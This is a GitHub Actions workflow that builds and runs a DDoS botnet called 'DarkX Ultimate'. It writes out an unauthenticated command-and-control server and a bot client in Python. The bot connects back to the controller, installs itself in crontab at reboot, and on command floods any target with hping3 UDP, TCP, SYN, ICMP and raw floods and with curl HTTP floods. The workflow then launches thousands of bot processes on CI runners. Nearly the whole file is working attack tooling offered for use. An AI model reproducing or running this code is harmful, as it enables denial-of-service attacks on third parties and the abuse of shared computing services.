name: DarkX Ultimate Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'

jobs:
  deploy-darkx-ultimate:
    runs-on: ubuntu-latest
    timeout-minutes: 4320

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Ultimate Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing ultimate dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
        sudo apt install -y nmap masscan hydra john netcat-openbsd
        sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
        pip3 install requests paramiko scapy cryptography colorama cloudscraper icmplib

    - name: Install Tailscale
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
        echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Create KryptonC2 CNC (No Auth)
      run: |
        cd darkx
        mkdir -p src/Commands/{Tools,Methods_L3,Methods_L4,Methods_L7,Methods_Games}
        
        # Create simplified CNC with no authentication
        cat > cnc.py << 'EOF'
        #!/usr/bin/env python3
        import socket
        import threading
        import time
        import random
        from colorama import Fore, init
        
        init(convert=True)
        
        banner = f'''
        {Fore.CYAN}
            ‚ñà‚ñà ‚ñÑ‚ñà‚ñÄ ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà ‚ñì‚ñà‚ñà   ‚ñà‚ñà‚ñì ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà  ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñÑ    ‚ñà 
            ‚ñà‚ñà‚ñÑ‚ñà‚ñí ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí ‚ñà‚ñà ‚ñÄ‚ñà   ‚ñà 
            ‚ñì‚ñà‚ñà‚ñà‚ñÑ‚ñë ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí ‚ñí‚ñà‚ñà ‚ñà‚ñà‚ñë‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà  ‚ñÄ‚ñà ‚ñà‚ñà‚ñí
            ‚ñì‚ñà‚ñà ‚ñà‚ñÑ ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ   ‚ñë ‚ñê‚ñà‚ñà‚ñì‚ñë‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñì‚ñà‚ñà‚ñí  ‚ñê‚ñå‚ñà‚ñà‚ñí
            ‚ñí‚ñà‚ñà‚ñí ‚ñà‚ñÑ‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñà‚ñà‚ñí‚ñì‚ñë‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë  ‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñí‚ñà‚ñà‚ñë   ‚ñì‚ñà‚ñà‚ñë
            ‚ñí ‚ñí‚ñí ‚ñì‚ñí‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñí ‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë  ‚ñí ‚ñë‚ñë   ‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñí‚ñë   ‚ñí ‚ñí 
            ‚ñë ‚ñë‚ñí ‚ñí‚ñë  ‚ñë‚ñí ‚ñë ‚ñí‚ñë‚ñì‚ñà‚ñà ‚ñë‚ñí‚ñë ‚ñë‚ñí ‚ñë         ‚ñë      ‚ñë ‚ñí ‚ñí‚ñë ‚ñë ‚ñë‚ñë   ‚ñë ‚ñí‚ñë
            ‚ñë ‚ñë‚ñë ‚ñë   ‚ñë‚ñë   ‚ñë ‚ñí ‚ñí ‚ñë‚ñë  ‚ñë‚ñë         ‚ñë      ‚ñë ‚ñë ‚ñë ‚ñí     ‚ñë   ‚ñë ‚ñë 
            ‚ñë  ‚ñë      ‚ñë     ‚ñë ‚ñë                           ‚ñë ‚ñë           ‚ñë 
                            ‚ñë ‚ñë                                           
        
        {Fore.WHITE}            DarkX Ultimate - NO AUTH REQUIRED
        {Fore.YELLOW}            Type "help" for commands
        {Fore.GREEN}            Bots Online: 0
        '''
        
        class DarkXCNC:
            def __init__(self, host='0.0.0.0', port=5555):
                self.host = host
                self.port = port
                self.bots = []
                self.bot_lock = threading.Lock()
                self.running = True
                
            def start_server(self):
                try:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    self.sock.bind((self.host, self.port))
                    self.sock.listen(500)
                    print(f"{Fore.GREEN}üöÄ DarkX CNC Server started on {self.host}:{self.port}")
                    print(f"{Fore.RED}üî• NO AUTHENTICATION REQUIRED")
                    
                    # Start bot ping thread
                    threading.Thread(target=self.ping_bots, daemon=True).start()
                    
                    while self.running:
                        try:
                            client_socket, client_address = self.sock.accept()
                            threading.Thread(target=self.handle_client, args=(client_socket, client_address), daemon=True).start()
                        except Exception as e:
                            if self.running:
                                print(f"{Fore.RED}Error accepting connection: {e}")
                except Exception as e:
                    print(f"{Fore.RED}Failed to start server: {e}")
                    
            def ping_bots(self):
                while self.running:
                    dead_bots = []
                    with self.bot_lock:
                        for bot in self.bots:
                            try:
                                bot.settimeout(3)
                                bot.send(b'PING')
                                response = bot.recv(1024).decode().strip()
                                if response != 'PONG':
                                    dead_bots.append(bot)
                            except:
                                dead_bots.append(bot)
                    
                    for bot in dead_bots:
                        with self.bot_lock:
                            if bot in self.bots:
                                self.bots.remove(bot)
                        bot.close()
                    
                    time.sleep(5)
                    
            def handle_client(self, client_socket, client_address):
                try:
                    # Check if it's a bot or user
                    client_socket.settimeout(5.0)
                    initial_data = client_socket.recv(1024).decode().strip()
                    
                    if initial_data == "BOT_CONNECTED":
                        # It's a bot
                        with self.bot_lock:
                            self.bots.append(client_socket)
                        print(f"{Fore.GREEN}ü§ñ New bot connected: {client_address[0]} (Total: {len(self.bots)})")
                        client_socket.send(b"Connected to DarkX CNC\n")
                        
                        # Keep bot connection alive
                        while True:
                            try:
                                data = client_socket.recv(1024).decode().strip()
                                if not data:
                                    break
                                if data == "PING":
                                    client_socket.send(b"PONG\n")
                            except:
                                break
                    else:
                        # It's a user - NO AUTHENTICATION
                        self.handle_user(client_socket)
                        
                except Exception as e:
                    print(f"{Fore.RED}Error handling client: {e}")
                finally:
                    with self.bot_lock:
                        if client_socket in self.bots:
                            self.bots.remove(client_socket)
                            print(f"{Fore.YELLOW}ü§ñ Bot disconnected: {client_address[0]} (Total: {len(self.bots)})")
                    try:
                        client_socket.close()
                    except:
                        pass
                    
            def handle_user(self, client_socket):
                try:
                    # Send banner with current bot count
                    bot_count = len(self.bots)
                    welcome_banner = banner.replace("Bots Online: 0", f"Bots Online: {bot_count}")
                    
                    client_socket.send(welcome_banner.encode())
                    client_socket.send(f"\n{Fore.WHITE}Connected Bots: {bot_count}\n\n".encode())
                    
                    while True:
                        client_socket.send(f"{Fore.CYAN}darkx> {Fore.WHITE}".encode())
                        data = client_socket.recv(1024).decode().strip()
                        if not data:
                            break
                            
                        command = data.upper()
                        
                        if command == "BOTS":
                            client_socket.send(f"{Fore.GREEN}Connected Bots: {len(self.bots)}\n".encode())
                            
                        elif command.startswith("ATTACK"):
                            parts = command.split(" ")
                            if len(parts) >= 4:
                                target = parts[1]
                                port = parts[2]
                                duration = parts[3]
                                
                                attack_command = f"ATTACK {target} {port} {duration}"
                                bot_count = len(self.bots)
                                
                                with self.bot_lock:
                                    for bot in self.bots:
                                        try:
                                            bot.send(f"{attack_command}\n".encode())
                                        except:
                                            pass
                                
                                client_socket.send(f"{Fore.GREEN}‚ö° Attack launched on {target}:{port} with {bot_count} bots\n".encode())
                                client_socket.send(f"{Fore.YELLOW}üìä Estimated Power: {bot_count * 100} Mbps\n".encode())
                            else:
                                client_socket.send(f"{Fore.RED}Usage: attack <target> <port> <duration>\n".encode())
                                
                        elif command == "HELP":
                            help_text = f"""
        {Fore.CYAN}Commands:
        {Fore.WHITE}bots          {Fore.YELLOW}- Show connected bots
        {Fore.WHITE}attack        {Fore.YELLOW}- Launch DDoS attack
        {Fore.WHITE}help          {Fore.YELLOW}- Show this help
        {Fore.WHITE}exit          {Fore.YELLOW}- Disconnect
        
        {Fore.GREEN}Attack Usage: attack <target> <port> <duration>
        {Fore.GREEN}Example: attack 1.1.1.1 80 60s
                            """
                            client_socket.send(help_text.encode())
                            
                        elif command == "CLEAR" or command == "CLS":
                            client_socket.send(b"\033[2J\033[H")
                            client_socket.send(welcome_banner.encode())
                            
                        elif command == "EXIT":
                            client_socket.send(f"{Fore.YELLOW}Goodbye!\n".encode())
                            break
                            
                        else:
                            client_socket.send(f"{Fore.RED}Unknown command. Type 'help' for commands.\n".encode())
                            
                except Exception as e:
                    print(f"{Fore.RED}Error handling user: {e}")
                    
            def stop_server(self):
                self.running = False
                try:
                    self.sock.close()
                except:
                    pass
                    
        if __name__ == "__main__":
            cnc = DarkXCNC(port=5555)
            try:
                cnc.start_server()
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}üõë Shutting down CNC server...")
                cnc.stop_server()
        EOF

    - name: Create Bot Client with All Methods
      run: |
        cd darkx
        cat > bot.py << 'EOF'
        #!/usr/bin/env python3
        import socket
        import threading
        import time
        import subprocess
        import random
        import os
        import requests
        import cloudscraper
        from scapy.all import *
        from icmplib import ping as icmp_ping
        
        class DarkXBot:
            def __init__(self, cnc_ip, cnc_port=5555):
                self.cnc_ip = cnc_ip
                self.cnc_port = cnc_port
                self.running = True
                
            def connect_to_cnc(self):
                while self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(30)
                        sock.connect((self.cnc_ip, self.cnc_port))
                        
                        # Identify as bot
                        sock.send(b"BOT_CONNECTED\n")
                        print(f"‚úÖ Connected to CNC at {self.cnc_ip}:{self.cnc_port}")
                        
                        # Handle commands from CNC
                        while self.running:
                            try:
                                data = sock.recv(1024).decode().strip()
                                if not data:
                                    break
                                    
                                if data.startswith("ATTACK"):
                                    parts = data.split(" ")
                                    if len(parts) >= 4:
                                        target = parts[1]
                                        port = parts[2] 
                                        duration = parts[3]
                                        print(f"üöÄ Executing attack: {target}:{port} for {duration}")
                                        threading.Thread(target=self.execute_attack, args=(target, port, duration), daemon=True).start()
                                        
                                elif data == "PING":
                                    sock.send(b"PONG\n")
                                    
                            except socket.timeout:
                                continue
                            except Exception as e:
                                break
                                
                        sock.close()
                        print("‚ùå Disconnected from CNC, reconnecting...")
                        
                    except Exception as e:
                        print(f"‚ùå Connection failed: {e}")
                        
                    time.sleep(10)
                    
            def execute_attack(self, target, port, duration):
                try:
                    # Convert duration to seconds
                    if duration.endswith('s'):
                        secs = int(duration[:-1])
                    elif duration.endswith('m'):
                        secs = int(duration[:-1]) * 60
                    elif duration.endswith('h'):
                        secs = int(duration[:-1]) * 3600
                    else:
                        secs = int(duration)
                        
                    end_time = time.time() + secs
                    
                    # Launch multiple attack methods
                    methods = [
                        self.udp_flood, self.tcp_flood, self.syn_flood,
                        self.http_flood, self.icmp_flood, self.ntp_amp,
                        self.mem_amp, self.hex_flood, self.junk_flood
                    ]
                    
                    for method in methods:
                        if method in [self.udp_flood, self.tcp_flood, self.syn_flood, self.http_flood, self.hex_flood, self.junk_flood]:
                            threading.Thread(target=method, args=(target, port, end_time), daemon=True).start()
                        elif method in [self.icmp_flood]:
                            threading.Thread(target=method, args=(target, end_time), daemon=True).start()
                        elif method in [self.ntp_amp, self.mem_amp]:
                            threading.Thread(target=method, args=(target, port, end_time), daemon=True).start()
                    
                    print(f"üí• Started attack on {target}:{port} for {secs} seconds")
                    
                except Exception as e:
                    print(f"‚ùå Attack error: {e}")
                    
            # Layer 4 Methods
            def udp_flood(self, target, port, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "10", "hping3", "--udp", 
                            "-p", str(port), "--flood", target
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(1)
                    
            def tcp_flood(self, target, port, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "10", "hping3", 
                            "-p", str(port), "--flood", target
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(1)
                    
            def syn_flood(self, target, port, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "10", "hping3", "--syn",
                            "-p", str(port), "--flood", target
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(1)
                    
            # Layer 7 Methods
            def http_flood(self, target, port, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "5", "curl", "-s",
                            f"http://{target}:{port}"
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(0.1)
                    
            # Layer 3 Methods  
            def icmp_flood(self, target, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "10", "hping3", "--icmp",
                            "--flood", target
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(1)
                    
            # AMP Methods
            def ntp_amp(self, target, port, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "10", "hping3", "--udp",
                            "-p", "123", "--flood", target
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(1)
                    
            def mem_amp(self, target, port, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "10", "hping3", "--udp", 
                            "-p", "11211", "--flood", target
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(1)
                    
            # Special Methods
            def hex_flood(self, target, port, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "10", "hping3", "--rawip",
                            "-p", str(port), "--flood", target
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(1)
                    
            def junk_flood(self, target, port, end_time):
                while time.time() < end_time:
                    try:
                        subprocess.Popen([
                            "timeout", "10", "hping3", "--rand-source",
                            "-p", str(port), "--flood", target
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
                    time.sleep(1)
                    
            def install_persistence(self):
                try:
                    # Install via crontab
                    subprocess.run([
                        "bash", "-c", 
                        "(crontab -l 2>/dev/null; echo '@reboot python3 /tmp/darkx_bot.py') | crontab -"
                    ], check=True)
                    print("‚úÖ Persistence installed")
                except Exception as e:
                    print(f"‚ùå Persistence failed: {e}")
                    
            def start(self):
                print("ü§ñ DarkX Bot Starting...")
                self.install_persistence()
                self.connect_to_cnc()
                
        if __name__ == "__main__":
            cnc_ip = "CNC_IP_PLACEHOLDER"
            bot = DarkXBot(cnc_ip)
            bot.start()
        EOF

    - name: Configure Components
      run: |
        cd darkx
        echo "Configuring DarkX components..."
        
        # Update bot with real CNC IP
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.CNC_IP }}/g" bot.py
        
        # Make scripts executable
        chmod +x cnc.py
        chmod +x bot.py
        
        # Copy bot to persistent location
        cp bot.py /tmp/darkx_bot.py
        chmod +x /tmp/darkx_bot.py
        
        echo "Components configured successfully"

    - name: Start CNC Server
      run: |
        cd darkx
        echo "üöÄ Starting DarkX CNC Server..."
        nohup python3 cnc.py > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        sleep 5
        echo "‚úÖ CNC Server started on port 5555"

    - name: Deploy Initial Bots
      run: |
        cd darkx
        echo "ü§ñ Deploying initial bot army..."
        
        # Deploy bots based on power level
        case "${{ github.event.inputs.power }}" in
            "100mb") COUNT=500 ;;
            "1gb") COUNT=2000 ;;
            "10gb") COUNT=8000 ;;
            "100gb") COUNT=20000 ;;
            "1tb") COUNT=50000 ;;
        esac
        
        echo "Deploying $COUNT bots..."
        
        for i in $(seq 1 $COUNT); do
            nohup python3 bot.py >/dev/null 2>&1 &
        done
        
        echo "‚úÖ Initial bots deployed"
        sleep 10

    - name: Start File Server
      run: |
        cd darkx
        python3 -m http.server 8000 > http.log 2>&1 &
        echo "HTTP_PID=$!" >> $GITHUB_ENV
        sleep 3

    - name: Display Dashboard
      run: |
        echo ""
        echo "=========================================="
        echo "        DARKX ULTIMATE BOTNET"
        echo "=========================================="
        echo "üî• NO AUTHENTICATION REQUIRED"
        echo "üí™ Power Level:    ${{ github.event.inputs.power }}"
        echo "üîÑ Recruitment:    ${{ github.event.inputs.recruitment }}"
        echo "üåê DarkX CNC:      ${{ env.CNC_IP }}:5555"
        echo "üöÄ Bot Deployment: ACTIVE"
        echo "üí• Target Power:   400+ Gbps"
        echo "=========================================="
        echo "üì° Connect: nc ${{ env.CNC_IP }} 5555"
        echo "üíª Commands:"
        echo "   bots - Show connected bots"
        echo "   attack <target> <port> <duration>"
        echo "   help - Show commands"
        echo "   clear - Clear screen"
        echo "   exit - Disconnect"
        echo ""
        echo "Example: attack 1.1.1.1 80 60s"
        echo "=========================================="
        echo ""

    - name: Maintain System
      run: |
        echo "üõ°Ô∏è DarkX Ultimate Active - Monitoring System"
        
        while true; do
          # Check if CNC is running
          if ! ps -p $CNC_PID > /dev/null 2>&1; then
            echo "üîÑ Restarting CNC Server..."
            cd darkx
            nohup python3 cnc.py > cnc_restart.log 2>&1 &
            CNC_PID=$!
          fi
          
          # Show real-time stats
          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
          TOTAL_PROCESSES=$(ps aux | grep "python3 bot.py" | grep -v grep | wc -l)
          ESTIMATED_POWER=$((CONNECTED_BOTS * 100))
          
          echo "[$(date +'%H:%M:%S')] Stats:"
          echo "  ü§ñ Connected Bots: $CONNECTED_BOTS"
          echo "  üìä Total Processes: $TOTAL_PROCESSES"
          echo "  ‚ö° Estimated Power: $ESTIMATED_POWER Mbps"
          echo "  üåê CNC Status: ACTIVE"
          
          # Auto-scale if needed
          if [ $CONNECTED_BOTS -lt 1000 ]; then
            echo "‚ûï Deploying more bots..."
            cd darkx
            for i in {1..500}; do
              nohup python3 bot.py >/dev/null 2>&1 &
            done
          fi
          
          sleep 30
        done
